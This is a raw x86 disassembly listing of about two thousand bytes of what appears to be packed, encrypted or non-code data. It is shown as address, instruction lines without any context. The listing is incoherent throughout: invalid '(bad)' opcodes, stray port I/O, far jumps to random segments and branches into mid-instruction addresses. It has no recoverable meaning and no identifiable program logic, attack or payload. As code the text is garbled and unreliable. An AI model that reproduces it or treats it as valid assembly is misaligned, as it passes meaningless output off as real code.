  414307:	adc    edi,DWORD PTR ds:0x145d47ce
  41430d:	add    DWORD PTR ds:0xc2876d5b,ebx
  414313:	xchg   edi,eax
  414314:	mov    edx,0xe9407b0b
  414319:	in     eax,dx
  41431a:	mov    ds:0x209591af,al
  41431f:	jmp    0x7cb3862e
  414324:	aas    
  414325:	or     DWORD PTR [ebp-0x45],edi
  414328:	sub    eax,0x5fcb8a32
  41432d:	xchg   ebp,eax
  41432e:	lds    esi,FWORD PTR [edx-0x80]
  414331:	or     al,BYTE PTR [ebx]
  414333:	cmp    BYTE PTR [ecx+0x3ca320d0],0xed
  41433a:	sub    DWORD PTR [esi-0x4d8ea97],edi
  414340:	sbb    edi,DWORD PTR [esi-0x744ee6a1]
  414346:	daa    
  414347:	pop    ss
  414348:	xor    edi,DWORD PTR [ecx+0x30]
  41434b:	mov    cs,WORD PTR [ebx]
  41434d:	dec    esp
  41434e:	(bad)  
  41434f:	bound  ecx,QWORD PTR [eax-0x2f6c7d2d]
  414355:	pop    DWORD PTR [ebx-0x29eb561e]
  41435b:	and    ecx,esp
  41435d:	xchg   ebx,eax
  41435e:	jmp    DWORD PTR [ebp+edx*8-0x1fe11707]
  414365:	fnsave [ebx+esi*1]
  414368:	mov    al,ds:0x9e5d6003
  41436d:	stos   DWORD PTR es:[edi],eax
  41436e:	(bad)  
  41436f:	aam    0x34
  414371:	xor    DWORD PTR [edx-0x7d],ebx
  414374:	mov    edx,esi
  414376:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414377:	push   ss
  414378:	jnp    0x4143e0
  41437a:	stos   BYTE PTR es:[edi],al
  41437b:	nop
  41437c:	fimul  WORD PTR [ecx+ecx*2]
  41437f:	mov    al,0xfa
  414381:	and    esp,DWORD PTR [edi-0x80]
  414384:	dec    edx
  414385:	pushf  
  414386:	bound  esp,QWORD PTR [edi]
  414388:	xchg   ebp,eax
  414389:	mov    ebx,0xdfda564f
  41438e:	push   0xeed91fed
  414393:	mov    edx,0x602c4462
  414398:	sbb    dh,BYTE PTR [edi]
  41439a:	mov    edi,0xff7f7cbb
  41439f:	stos   DWORD PTR es:[edi],eax
  4143a0:	stos   BYTE PTR es:[edi],al
  4143a1:	mov    al,ds:0x597b34d0
  4143a6:	pop    es
  4143a7:	cwde   
  4143a8:	fisub  DWORD PTR [ecx-0x5c7b40f1]
  4143ae:	leave  
  4143af:	adc    al,ch
  4143b1:	aas    
  4143b2:	push   edi
  4143b3:	jno    0x41434b
  4143b5:	out    dx,al
  4143b6:	retf   
  4143b7:	add    BYTE PTR [ebx+0x4e],bl
  4143ba:	jbe    0x4143a5
  4143bc:	xor    ah,BYTE PTR [edi]
  4143be:	ins    DWORD PTR es:[edi],dx
  4143bf:	in     al,dx
  4143c0:	add    ebx,esi
  4143c2:	ret    0xc3b6
  4143c5:	jecxz  0x4143c4
  4143c7:	js     0x4143eb
  4143c9:	adc    DWORD PTR [esi],edx
  4143cb:	sbb    al,0xc3
  4143cd:	mov    dl,0x9f
  4143cf:	jb     0x41436a
  4143d1:	xor    edi,DWORD PTR [esi]
  4143d3:	test   DWORD PTR [edi-0x67],ebx
  4143d6:	mov    ah,0xd6
  4143d8:	fs out dx,al
  4143da:	ja     0x414398
  4143dc:	mov    DWORD PTR [ebx+eax*4+0x893d0de],esi
  4143e3:	enter  0x8c7,0x3f
  4143e7:	sub    eax,0xf6cbce23
  4143ec:	jle    0x4143ec
  4143ee:	call   0xcf14767
  4143f3:	mov    edx,0x888e3895
  4143f8:	outs   dx,BYTE PTR ds:[esi]
  4143f9:	ja     0x414400
  4143fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143fc:	sub    cl,BYTE PTR [ebx]
  4143fe:	or     BYTE PTR [ecx],0xc0
  414401:	push   edi
  414402:	enter  0x2618,0x7a
  414406:	and    DWORD PTR [esi+0x57],ecx
  414409:	add    ecx,DWORD PTR [ebx+edi*1+0x4f40223d]
  414410:	leave  
  414411:	and    DWORD PTR [ebx-0x78788de1],esp
  414417:	push   ebx
  414418:	cmc    
  414419:	sti    
  41441a:	push   ebp
  41441b:	xchg   esi,eax
  41441c:	sbb    al,BYTE PTR [esi]
  41441e:	and    eax,0xdcadd88e
  414423:	cmp    DWORD PTR [ebp+0x2a],eax
  414426:	ds out dx,eax
  414428:	fwait
  414429:	or     eax,0x324904c3
  41442e:	mov    BYTE PTR [edx+0x72],al
  414431:	rcl    BYTE PTR [eax+0x2a],1
  414434:	cmp    DWORD PTR [esi+0x523ed518],esi
  41443a:	cmp    dh,bh
  41443c:	call   0x2ff7c004
  414441:	pop    es
  414442:	in     al,0x9d
  414444:	int3   
  414445:	lock test eax,0x1ce4b1db
  41444b:	mov    BYTE PTR [esi-0x7e],al
  41444e:	ret    
  41444f:	jg     0x4143f1
  414451:	das    
  414452:	and    eax,DWORD PTR [edi-0x44]
  414455:	sub    BYTE PTR [eax-0x74e3acea],0xd7
  41445c:	dec    ebp
  41445d:	fwait
  41445e:	cdq    
  41445f:	push   esp
  414460:	ret    0xb731
  414463:	xor    BYTE PTR [edx],0x9
  414466:	jmp    0xe3ba14eb
  41446b:	lds    edx,FWORD PTR [edx]
  41446d:	mov    al,ds:0x6845b6f9
  414472:	test   BYTE PTR [esp+esi*2-0x77],al
  414476:	mov    gs,WORD PTR [edi]
  414478:	aas    
  414479:	(bad)
  41447c:	leave  
  41447d:	push   es
  41447e:	add    BYTE PTR [eax-0x46],0x9c
  414482:	clc    
  414483:	jne    0x414441
  414485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414486:	pop    edx
  414487:	inc    ecx
  414488:	imul   esp,DWORD PTR [eax-0xf],0xedaebc60
  41448f:	enter  0x5405,0xb0
  414493:	inc    ebx
  414494:	sub    eax,0x7aa36151
  414499:	fldenv [esi]
  41449b:	mov    DWORD PTR [edx-0x2bf05b4a],ebx
  4144a1:	mov    dl,0xf2
  4144a3:	pushf  
  4144a4:	fidivr WORD PTR [eax+eiz*1+0x65]
  4144a8:	das    
  4144a9:	mov    eax,ds:0x94b3ddae
  4144ae:	sahf   
  4144af:	in     eax,dx
  4144b0:	adc    DWORD PTR [edx+0x4c812872],ecx
  4144b6:	inc    ebx
  4144b7:	arpl   WORD PTR [eax-0x7],di
  4144ba:	aaa    
  4144bb:	ror    DWORD PTR [ecx],cl
  4144bd:	retf   0x13d0
  4144c0:	into   
  4144c1:	inc    ebx
  4144c2:	mov    dl,0x24
  4144c4:	icebp  
  4144c5:	sub    BYTE PTR [ebx+0x7817c13e],cl
  4144cb:	push   eax
  4144cc:	adc    edx,ebp
  4144ce:	pushf  
  4144cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144d0:	retf   0x6bf4
  4144d3:	outs   dx,DWORD PTR ds:[esi]
  4144d4:	or     al,0x6e
  4144d6:	repnz xchg esp,eax
  4144d8:	xchg   ebp,eax
  4144d9:	mov    esp,0xd0b1209b
  4144de:	xor    al,0x6a
  4144e0:	(bad)  
  4144e1:	jmp    0x3567a35d
  4144e6:	jecxz  0x4144af
  4144e8:	repz and ecx,DWORD PTR [edi+0x388bc42b]
  4144ef:	jmp    0x4144d2
  4144f1:	adc    eax,0x1079dac7
  4144f6:	icebp  
  4144f7:	mov    eax,0xbc84ff34
  4144fc:	and    edi,DWORD PTR [ecx+ebp*1]
  4144ff:	cmp    edx,DWORD PTR [ebx+0x65e988e1]
  414505:	jne    0x4144b3
  414507:	or     BYTE PTR [ecx+edi*1],dl
  41450a:	scas   eax,DWORD PTR es:[edi]
  41450b:	xlat   BYTE PTR ds:[ebx]
  41450c:	dec    ebx
  41450d:	pop    ds
  41450e:	jo     0x414549
  414510:	and    al,0xcf
  414512:	push   esi
  414513:	adc    DWORD PTR [edx],esi
  414515:	shr    ch,cl
  414517:	xchg   edx,eax
  414518:	and    ah,0x49
  41451b:	inc    edx
  41451c:	mov    dh,0x58
  41451e:	inc    BYTE PTR [esp+eax*1+0x64]
  414522:	push   edi
  414523:	shr    ebx,0xc4
  414526:	dec    edi
  414527:	retf   0xc007
  41452a:	sbb    eax,0xea625dea
  41452f:	dec    edi
  414530:	lds    ebx,FWORD PTR [edx-0x75]
  414533:	scas   al,BYTE PTR es:[edi]
  414534:	push   cs
  414535:	es mov ch,0x7d
  414538:	dec    ebx
  414539:	addr16 retf 0x6782
  41453d:	push   0xae4ba51e
  414542:	fdiv   QWORD PTR [esi+0x3c]
  414545:	mov    ds:0xc817aff7,eax
  41454a:	pop    edx
  41454b:	jmp    0x74cb:0x7b92529e
  414552:	dec    edx
  414553:	cmc    
  414554:	mov    ebx,0xf1c95ab1
  414559:	adc    BYTE PTR [edi+0x34],bh
  41455c:	clc    
  41455d:	mov    DWORD PTR [eax+ebp*8+0x6f],edi
  414561:	nop
  414562:	sbb    eax,0x3cc74a23
  414567:	stos   DWORD PTR es:[edi],eax
  414568:	adc    BYTE PTR [edi+0x3],0xad
  41456c:	push   esi
  41456d:	fidiv  DWORD PTR [ebx+0x6364e9fa]
  414573:	push   edi
  414574:	pop    ebx
  414575:	adc    bl,bh
  414577:	jno    0x4145ef
  414579:	mov    esp,0xaa116143
  41457e:	es add eax,0xc77638f8
  414584:	push   esp
  414585:	xchg   ebp,eax
  414586:	fwait
  414587:	pop    ss
  414588:	or     dl,BYTE PTR [eax-0x56]
  41458b:	mov    ebp,0xb34c7887
  414590:	or     ecx,edi
  414592:	mov    ecx,0x4228fc9a
  414597:	push   edx
  414598:	mov    al,0x19
  41459a:	loope  0x414580
  41459c:	addr16 leave 
  41459e:	adc    al,0x19
  4145a0:	mov    edi,0x3dca0c58
  4145a5:	je     0x414542
  4145a7:	dec    esp
  4145a8:	mov    ch,BYTE PTR [ecx+0x7f]
  4145ab:	mov    edi,0xd0adb431
  4145b0:	jae    0x41456b
  4145b2:	fild   DWORD PTR [edi]
  4145b4:	shl    BYTE PTR [edx],1
  4145b6:	(bad)
  4145bc:	jns    0x41457e
  4145be:	inc    edx
  4145bf:	cs mov dl,0x36
  4145c2:	fs call 0xf931:0x3c09d238
  4145ca:	scas   eax,DWORD PTR es:[edi]
  4145cb:	stos   DWORD PTR es:[edi],eax
  4145cc:	sub    ebx,DWORD PTR [ebp+0x12bcb610]
  4145d2:	lahf   
  4145d3:	cs push ecx
  4145d5:	xor    BYTE PTR [ebx+esi*2],dh
  4145d8:	out    0x46,al
  4145da:	not    ecx
  4145dc:	in     al,0x1c
  4145de:	jae    0x414598
  4145e0:	bnd jp 0x4145ba
  4145e3:	fwait
  4145e4:	jmp    DWORD PTR [edx]
  4145e6:	xchg   ebx,eax
  4145e7:	push   0xfffffff8
  4145e9:	xchg   edi,eax
  4145ea:	and    dl,dl
  4145ec:	xor    ebp,eax
  4145ee:	mov    eax,ds:0x60e8df38
  4145f3:	enter  0x44d5,0xb
  4145f7:	jo     0x4145dd
  4145f9:	(bad)  
  4145fa:	scas   eax,DWORD PTR es:[edi]
  4145fb:	enter  0xfe5,0x66
  4145ff:	sub    ebp,DWORD PTR [ebx]
  414601:	shr    esp,cl
  414603:	xor    eax,0x3b401cd2
  414608:	sbb    cl,BYTE PTR [esi+eiz*4+0x575feb64]
  41460f:	inc    ebp
  414610:	xchg   esp,eax
  414611:	les    ebx,FWORD PTR [esi]
  414613:	sub    eax,0x9a2db49
  414618:	cwde   
  414619:	cmc    
  41461a:	mov    eax,0xa4418e1b
  41461f:	jmp    0xe248:0x2ea1ee0f
  414626:	popf   
  414627:	mov    ebx,0xef10c739
  41462c:	into   
  41462d:	mov    al,ds:0xfc8416d5
  414632:	sbb    BYTE PTR [edi],al
  414634:	and    bl,BYTE PTR [edx-0x34d2989]
  41463a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41463b:	test   eax,0x583d65f5
  414640:	fdiv   st,st(4)
  414642:	pop    ebx
  414643:	int3   
  414644:	fdiv   st(7),st
  414646:	adc    esi,ecx
  414648:	pop    ecx
  414649:	dec    edx
  41464a:	and    DWORD PTR [edi+0x56e8b608],edx
  414650:	push   ebx
  414651:	mov    edi,0x72c2b0fe
  414656:	xor    al,0x4
  414658:	shl    DWORD PTR cs:[eax+eax*8-0x7],1
  41465d:	xor    al,0xbe
  41465f:	sbb    eax,0x27a75539
  414664:	pop    ss
  414665:	add    BYTE PTR [eax-0x70a16632],bh
  41466b:	sar    BYTE PTR [edi],0x7a
  41466e:	out    0x2d,al
  414670:	fstp   QWORD PTR [edi]
  414672:	xlat   BYTE PTR ds:[ebx]
  414673:	inc    ebx
  414674:	xchg   edi,eax
  414675:	dec    edx
  414676:	mov    eax,ds:0xb00fc3bc
  41467b:	add    al,0x66
  41467d:	test   BYTE PTR [edi+0x59be2c06],ah
  414683:	dec    ebx
  414684:	push   ecx
  414685:	f2xm1  
  414687:	(bad)  
  414688:	shl    DWORD PTR [edi-0x6],cl
  41468b:	out    0x51,al
  41468d:	fnstenv [ebx]
  41468f:	int    0xec
  414691:	inc    ecx
  414692:	popf   
  414693:	inc    esi
  414694:	mov    ch,0x18
  414696:	jmp    0x414653
  414698:	sbb    edi,0xbf83a760
  41469e:	mov    ah,0x5c
  4146a0:	popf   
  4146a1:	pop    ds
  4146a2:	xchg   esi,eax
  4146a3:	psubd  mm3,mm1
  4146a6:	sbb    BYTE PTR [ecx+eiz*2+0x4f6146c6],dl
  4146ad:	push   edi
  4146ae:	mov    ebx,0xe479487c
  4146b3:	dec    edi
  4146b4:	arpl   cx,sp
  4146b6:	pop    ecx
  4146b7:	xchg   esi,eax
  4146b8:	(bad)  
  4146b9:	adc    DWORD PTR [ebp-0x5d2e9f22],esi
  4146bf:	out    0x8c,eax
  4146c1:	std    
  4146c2:	loopne 0x414710
  4146c4:	int3   
  4146c5:	lock sub al,0xe7
  4146c8:	xor    eax,0x3022b317
  4146cd:	jge    0x41468b
  4146cf:	and    eax,0x4c4ea23a
  4146d4:	ja     0x41469f
  4146d6:	cmp    al,bl
  4146d8:	fisubr DWORD PTR [ecx+0x6a]
  4146db:	pop    ecx
  4146dc:	ins    DWORD PTR es:[edi],dx
  4146dd:	sub    DWORD PTR [ebp-0x3e],eax
  4146e0:	xchg   esp,eax
  4146e1:	xchg   esi,eax
  4146e2:	adc    DWORD PTR [ebp+ecx*4-0x7f],edi
  4146e6:	mov    ds:0xb39c9e82,eax
  4146eb:	mov    al,ds:0x46a6c849
  4146f0:	adc    eax,0x48d80a24
  4146f5:	push   esp
  4146f6:	shl    BYTE PTR [edx+0x5e],0xa0
  4146fa:	sbb    al,0xff
  4146fc:	ja     0x4146d5
  4146fe:	dec    ecx
  4146ff:	daa    
  414700:	neg    BYTE PTR [ebx*4+0x45464549]
  414707:	loope  0x41475f
  414709:	ss int 0x93
  41470c:	ins    BYTE PTR es:[edi],dx
  41470d:	ret    0xc0eb
  414710:	pushf  
  414711:	lidtd  [ebx-0x65ed41ff]
  414718:	mov    eax,ds:0xfbfec4a
  41471d:	rol    BYTE PTR [eax],1
  41471f:	leave  
  414720:	lock out 0x92,al
  414723:	dec    ebp
  414724:	adc    DWORD PTR [edx],esp
  414726:	lds    esi,FWORD PTR [edi]
  414728:	leave  
  414729:	fidiv  DWORD PTR [edx+0x2a]
  41472c:	add    al,0x7c
  41472e:	add    al,BYTE PTR [edi-0x4b053fb4]
  414734:	pop    ebp
  414735:	stc    
  414736:	imul   eax,DWORD PTR [ebx+0x7ac5e908],0x6304275c
  414740:	mov    esp,edx
  414742:	xchg   ebx,eax
  414743:	push   ebp
  414744:	(bad)  
  414745:	out    dx,al
  414746:	out    0xd6,eax
  414748:	into   
  414749:	rcr    DWORD PTR [ecx+0x11],0xe4
  41474d:	add    ah,al
  41474f:	shr    WORD PTR [esi+0x4eae9490],cl
  414756:	imul   esi,DWORD PTR [esi+0x2d8b167],0xffffffc8
  41475d:	in     eax,dx
  41475e:	inc    ebp
  41475f:	imul   ecx,DWORD PTR [edi-0x9],0xffffff88
  414763:	into   
  414764:	lea    ebp,[ebp-0x2de73816]
  41476a:	cmp    al,0x42
  41476c:	sub    eax,0xed522eb
  414771:	fwait
  414772:	xor    al,0x5f
  414774:	std    
  414775:	fld    QWORD PTR [edi+ebp*4-0x1a5dccf5]
  41477c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41477d:	ret    0xf6eb
  414780:	ja     0x41477d
  414782:	mov    ebp,0x10ab9c87
  414787:	jae    0x4147b6
  414789:	push   edx
  41478a:	loopne 0x414728
  41478c:	jno    0x4147ba
  41478e:	sbb    DWORD PTR [edx-0x70],ecx
  414791:	lods   eax,DWORD PTR ds:[esi]
  414792:	jmp    0x4147e9
  414794:	out    dx,al
  414795:	xchg   ebp,eax
  414796:	add    eax,DWORD PTR [ecx+ebp*8+0x773b38fb]
  41479d:	mov    bl,0xf8
  41479f:	fimul  WORD PTR [esi+0x673706ff]
  4147a5:	shl    eax,1
  4147a7:	mov    bh,0xae
  4147a9:	adc    cl,bh
  4147ab:	mov    cl,0xf6
  4147ad:	mov    bl,0x58
  4147af:	sbb    al,0x7b
  4147b1:	and    eax,0x7e5fa7db
  4147b6:	jg     0x414796
  4147b8:	mov    dh,0x1f
  4147ba:	(bad)  
  4147bb:	rcr    BYTE PTR [ebx],cl
  4147bd:	aaa    
  4147be:	cmp    eax,0x3dc83b11
  4147c3:	cmp    dh,BYTE PTR [edx+0x3d]
  4147c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147c7:	cmp    eax,0x451132d1
  4147cc:	sub    al,0x91
  4147ce:	sti    
  4147cf:	pop    ds
  4147d0:	outs   dx,BYTE PTR ds:[esi]
  4147d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147d2:	jns    0x4147b8
  4147d4:	aam    0xaf
  4147d6:	sahf   
  4147d7:	ins    BYTE PTR es:[edi],dx
  4147d8:	jno    0x414771
  4147da:	inc    eax
  4147db:	and    DWORD PTR [ebx-0x2fe5faac],esp
  4147e1:	or     esi,DWORD PTR [edx]
  4147e3:	jnp    0x414857
  4147e5:	icebp  
  4147e6:	pusha  
  4147e7:	xchg   esp,eax
  4147e8:	popf   
  4147e9:	pusha  
  4147ea:	cwde   
  4147eb:	mov    esp,0x186703a5
  4147f0:	mov    esi,0x3d2b5484
  4147f5:	(bad)  [eax-0x65]
  4147f8:	popf   
  4147f9:	mov    dh,0xb3
  4147fb:	pop    eax
  4147fc:	pop    ds
  4147fd:	pop    edi
  4147fe:	clc    
  4147ff:	pop    ds
  414800:	aad    0xdd
  414802:	jle    0x41481f
  414804:	cld    
  414805:	push   eax
  414806:	je     0x414874
  414808:	jae    0x41478f
  41480a:	or     DWORD PTR [ebp+0x639a2fd4],0x2f8a2c6a
  414814:	mov    al,0xcf
  414816:	dec    BYTE PTR [ecx+0x3464652c]
  41481c:	and    DWORD PTR ss:[ecx-0x1f],esi
  414820:	div    DWORD PTR [ebp-0xc]
  414823:	rcr    DWORD PTR [eax+eiz*4-0x483b8fcb],0xc1
  41482b:	pop    esp
  41482c:	jns    0x4147e2
  41482e:	push   ebx
  41482f:	leave  
  414830:	addr16 das 
  414832:	dec    ecx
  414833:	jnp    0x414833
  414835:	cmc    
  414836:	lods   eax,DWORD PTR ds:[esi]
  414837:	xor    ecx,edx
  414839:	mov    esi,ebp
  41483b:	dec    edx
  41483c:	enter  0xdcc,0x6b
  414840:	shl    BYTE PTR [ebx],1
  414842:	ins    DWORD PTR es:[edi],dx
  414843:	xor    bh,dh
  414845:	or     al,0x85
  414847:	loop   0x414871
  414849:	es jnp 0x4147f4
  41484c:	icebp  
  41484d:	fmul   DWORD PTR [edi+edi*1-0x5e]
  414851:	inc    edi
  414852:	or     DWORD PTR [eax],0xff5fe165
  414858:	imul   ebp,DWORD PTR [eax],0x6e4edaf8
  41485e:	mov    al,0xa5
  414860:	add    DWORD PTR [ebp+0x35],ebp
  414863:	mul    BYTE PTR [ebp+0x76]
  414866:	stc    
  414867:	dec    edi
  414868:	sbb    ch,BYTE PTR [ecx+0x927ad63]
  41486e:	sub    eax,0xdf9f6e73
  414873:	xlat   BYTE PTR ds:[ebx]
  414874:	mov    cl,bl
  414876:	scas   al,BYTE PTR es:[edi]
  414877:	ror    BYTE PTR [ebx-0xe],0xa8
  41487b:	xchg   esp,eax
  41487c:	(bad)  
  41487d:	xchg   edi,eax
  41487e:	(bad)  
  41487f:	in     al,dx
  414880:	fidiv  DWORD PTR [ebx+0x2e]
  414883:	and    eax,0x23d7431c
  414888:	popa   
  414889:	add    bh,BYTE PTR [eax+0x6c623af8]
  41488f:	and    al,0xe7
  414891:	inc    ebp
  414892:	mov    bl,0xe8
  414894:	jmp    0x41485f
  414896:	sahf   
  414897:	cmp    ecx,DWORD PTR [eax+0x43]
  41489a:	mov    esi,0x78ada411
  41489f:	je     0x4148ee
  4148a1:	rcr    BYTE PTR [eax+0xe],0x5
  4148a5:	add    DWORD PTR [edi+ebp*2],ebp
  4148a8:	push   ds
  4148a9:	or     BYTE PTR [ecx+0x2e1f6744],ah
  4148af:	and    BYTE PTR [eax],al
  4148b1:	std    
  4148b2:	int3   
  4148b3:	imul   ebx,DWORD PTR [eax+0x753598dc],0x30a36eb7
  4148bd:	(bad)  
  4148bf:	adc    eax,0xc5a272ab
  4148c4:	cmp    DWORD PTR [eax],esi
  4148c6:	add    eax,0xf6d7c104
  4148cb:	pusha  
  4148cc:	xor    al,0x7a
  4148ce:	inc    ebp
  4148cf:	or     al,0xfd
  4148d1:	or     esp,DWORD PTR [eax+0x24]
  4148d4:	push   ds
  4148d5:	xchg   DWORD PTR [eax+0xa],ebx
  4148d8:	inc    ecx
  4148d9:	inc    edi
  4148da:	inc    ecx
  4148db:	add    al,BYTE PTR [ecx-0x6edac15a]
  4148e1:	sbb    DWORD PTR [edx-0x21],esi
  4148e4:	xor    al,0xa8
  4148e6:	or     ebp,DWORD PTR [esi]
  4148e8:	mov    dl,0x65
  4148ea:	push   ds
  4148eb:	out    0xd4,eax
  4148ed:	mov    al,ds:0xc211d076
  4148f2:	aam    0xfb
  4148f4:	and    eax,0xf29e96eb
  4148f9:	sbb    esp,DWORD PTR [edi]
  4148fb:	popa   
  4148fc:	scas   eax,DWORD PTR es:[edi]
  4148fd:	test   DWORD PTR [bp-0x42],esp
  414901:	add    cl,BYTE PTR [edi]
  414903:	xor    esi,DWORD PTR [edx+esi*2]
  414906:	dec    ecx
  414907:	jl     0x414891
  414909:	cmp    DWORD PTR [edx-0x1b21cb3],0xf3b06182
  414913:	lods   al,BYTE PTR ds:[esi]
  414914:	in     al,0xd5
  414916:	xor    ecx,DWORD PTR [ebx+ebx*2]
  414919:	iret   
  41491a:	aaa    
  41491b:	lea    esp,[eax+0x15b57693]
  414921:	inc    esp
  414922:	ret    0x3e1a
  414925:	pop    esp
  414926:	(bad)  
  414927:	aam    0x65
  414929:	and    BYTE PTR [edx],bl
  41492b:	cmp    ah,BYTE PTR [esi+eax*1+0x4b]
  41492f:	xchg   ebp,eax
  414930:	mov    ah,0xb8
  414932:	aaa    
  414933:	aad    0xc3
  414935:	stos   DWORD PTR es:[edi],eax
  414936:	sahf   
  414937:	leave  
  414938:	add    DWORD PTR [ebp+edx*4-0x3f],0xffffff97
  41493d:	push   esi
  41493e:	sub    ah,BYTE PTR [esi-0x3ad82215]
  414944:	shr    DWORD PTR [esi],1
  414946:	cwde   
  414947:	ror    BYTE PTR [eax],0x42
  41494a:	aam    0x62
  41494c:	xchg   DWORD PTR [eax+0x1b2bd675],esi
  414952:	and    BYTE PTR cs:[ebx+0x28],bl
  414956:	mov    al,ds:0x8a0f3cf2
  41495b:	dec    esp
  41495c:	xor    DWORD PTR [ecx+eax*4+0x31],edi
  414960:	pop    esi
  414961:	fdiv   st(1),st
  414963:	pop    ss
  414964:	pop    ds
  414965:	loopne 0x41495b
  414967:	inc    ebx
  414968:	or     esp,DWORD PTR [eax]
  41496a:	in     eax,dx
  41496b:	mov    WORD PTR [edi+0x2aed8cf7],fs
  414971:	loop   0x4148ff
  414973:	pop    ds
  414974:	jmp    0x414936
  414976:	or     al,BYTE PTR [esp+ebx*1]
  414979:	xor    ch,BYTE PTR [esi]
  41497b:	xlat   BYTE PTR ds:[ebx]
  41497c:	sub    ebx,DWORD PTR [eax+ebx*4]
  41497f:	mov    bh,0xf4
  414981:	adc    BYTE PTR ds:0x91012da1,ah
  414987:	test   eax,0x317ee90f
  41498c:	iret   
  41498d:	call   DWORD PTR [edx-0x5]
  414990:	pop    ebp
  414991:	jge    0x4149a5
  414993:	dec    esp
  414994:	xlat   BYTE PTR ds:[ebx]
  414995:	shl    BYTE PTR ds:0x5b044be,0xb2
  41499c:	dec    esp
  41499d:	jmp    0x4149ae
  41499f:	outs   dx,DWORD PTR ds:[esi]
  4149a0:	out    0x68,al
  4149a2:	adc    dh,dh
  4149a4:	mov    ebp,0xe0287115
  4149a9:	shl    al,0xd4
  4149ac:	in     eax,dx
  4149ad:	int3   
  4149ae:	push   edi
  4149af:	stos   DWORD PTR es:[edi],eax
  4149b0:	fwait
  4149b1:	mov    DWORD PTR [edx-0x6d],edx
  4149b4:	jae    0x414a15
  4149b6:	cld    
  4149b7:	cmp    DWORD PTR ds:0x50de19e3,ebx
  4149bd:	xor    dl,dh
  4149bf:	es adc al,0xf0
  4149c2:	repz push esi
  4149c4:	mov    ch,BYTE PTR [ebx+0x4f]
  4149c7:	je     0x414a22
  4149c9:	(bad)  
  4149ca:	stc    
  4149cb:	mov    ebx,ecx
  4149cd:	add    DWORD PTR [bx],ebp
  4149d0:	in     eax,0x40
  4149d2:	xchg   edi,eax
  4149d3:	mov    dh,0x51
  4149d5:	pop    eax
  4149d6:	inc    edx
  4149d7:	pop    edx
  4149d8:	mov    al,ds:0x3af82
  4149dd:	add    BYTE PTR [eax],al
  4149df:	add    BYTE PTR [eax],al
  4149e1:	add    BYTE PTR [esi-0x77],bl
  4149e4:	add    eax,0x7feed766
  4149e9:	mov    ecx,0x4f6277d8
  4149ee:	push   ds
  4149ef:	push   ds
  4149f0:	std    
  4149f1:	jo     0x414a72
  4149f3:	dec    esp
  4149f4:	add    DWORD PTR [eax],eax
  4149f6:	and    al,BYTE PTR [edi]
  4149f8:	add    BYTE PTR [eax],al
  4149fa:	lahf   
  4149fb:	jmp    0x10c69c9f
  414a00:	dec    eax
  414a01:	or     eax,0x32e2309e
  414a06:	jle    0x4149ed
  414a08:	adc    eax,0xbd603882
  414a0d:	sub    ebx,esi
  414a0f:	push   cs
  414a10:	sub    cl,BYTE PTR [eax]
  414a12:	leave  
  414a13:	xchg   ecx,eax
  414a14:	icebp  
  414a15:	call   0x6aab:0xae755ee9
  414a1c:	jle    0x4149cb
  414a1e:	imul   edi,DWORD PTR [eax+0x5eb60143],0xdc213c92
  414a28:	sbb    eax,0xf7170e09
  414a2d:	aas    
  414a2e:	xor    eax,0x225323a0
  414a33:	pop    edi
  414a34:	mov    dl,0xa1
  414a36:	rcr    edx,0x17
  414a39:	push   esi
  414a3a:	or     esi,edx
  414a3c:	mov    cl,BYTE PTR [ecx+0x34]
  414a3f:	jg     0x414a07
  414a41:	rcr    BYTE PTR [ecx+0x50],cl
  414a44:	inc    edx
  414a45:	add    eax,0x90124b56
  414a4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a4b:	jae    0x414a1b
  414a4d:	xor    al,0x9f
  414a4f:	or     BYTE PTR ss:[ebp-0x2b596aa],ch
  414a56:	hlt    
  414a57:	pop    es
  414a58:	nop
  414a59:	out    0x2d,eax
  414a5b:	fist   WORD PTR [edx]
  414a5d:	jge    0x414a5d
  414a5f:	jnp    0x414aba
  414a61:	call   edi
  414a63:	adc    DWORD PTR [ecx+0x3410935e],0x3
  414a6a:	sub    al,0x81
  414a6c:	stos   BYTE PTR es:[edi],al
  414a6d:	pop    ebx
  414a6e:	imul   ebx,esi,0xa0c87adc
  414a74:	add    al,0xad
  414a76:	cli    
  414a77:	xchg   DWORD PTR [ecx+edi*4],esp
  414a7a:	out    0xab,eax
  414a7c:	in     al,0x59
  414a7e:	add    eax,0xc574e78a
  414a83:	sub    al,BYTE PTR [eax+0x2c]
  414a86:	xor    ecx,ecx
  414a88:	sbb    cl,al
  414a8a:	xchg   esp,eax
  414a8b:	lods   al,BYTE PTR ds:[esi]
  414a8c:	jl     0x414ad3
  414a8e:	call   0xdf09:0x251d2990
  414a95:	sbb    ecx,DWORD PTR [ecx-0x56eef688]
  414a9b:	adc    BYTE PTR ds:0x1198910a,dh
  414aa1:	out    0xb1,eax
  414aa3:	xor    dh,cl
  414aa5:	mov    edx,0x8424fcb0
  414aaa:	jne    0x414a38
  414aac:	push   eax
  414aad:	mov    edx,0xeaa21fe3
  414ab2:	loopne 0x414a81
  414ab4:	mov    ch,0xba
  414ab6:	imul   esp,DWORD PTR [ebx+0x72],0xfffffffb
  414aba:	rcl    DWORD PTR [esi],0x2
  414abd:	push   es
  414abe:	and    eax,0x775335a8
  414ac3:	push   ss
  414ac4:	xchg   esp,eax
  414ac5:	leave  
  414ac6:	int3   
  414ac7:	fld    DWORD PTR [ebp-0x28]
  414aca:	and    al,0xb3
  414acc:	dec    edi
  414acd:	cmp    dl,bh
  414acf:	sub    DWORD PTR [ecx-0x67],edi
  414ad2:	adc    esp,DWORD PTR [ebx]
  414ad4:	xor    dh,BYTE PTR [eax+0x33]
  414ad7:	fisub  WORD PTR [eax+edi*1-0x12893ff8]
  414ade:	(bad)  [ebp+0x2d61b6b0]
  414ae4:	xchg   esi,eax
  414ae5:	cmp    al,0x5d
  414ae7:	inc    BYTE PTR [esi-0x44]
  414aea:	pusha  
  414aeb:	fcmovnbe st,st(2)
  414aed:	sbb    al,0x85
  414aef:	push   ds
